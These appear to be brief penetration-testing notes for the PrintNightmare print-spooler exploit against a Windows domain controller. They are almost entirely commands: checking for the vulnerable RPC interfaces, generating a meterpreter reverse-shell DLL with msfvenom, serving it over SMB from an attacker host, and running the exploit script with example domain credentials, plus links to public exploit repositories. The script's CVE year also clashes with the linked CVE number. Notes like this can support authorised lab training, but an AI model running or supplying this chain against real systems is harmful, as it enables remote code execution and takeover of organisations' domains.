

```
rpcdump @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
```

grab the python code and slap it in your impacket folder. run this code with a malicious DLL. msfvenom works ofcourse

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=9999 -f dll > shell.dll
```

```
sudo smbserver.py share `pwd` -smb2support
```

```
python3 CVE-2023-1675.py  MARVEL.local/fcastle:Password1@DC_IP '\\ATTACKER_IP\share\shell.dll'
```



cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)

calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)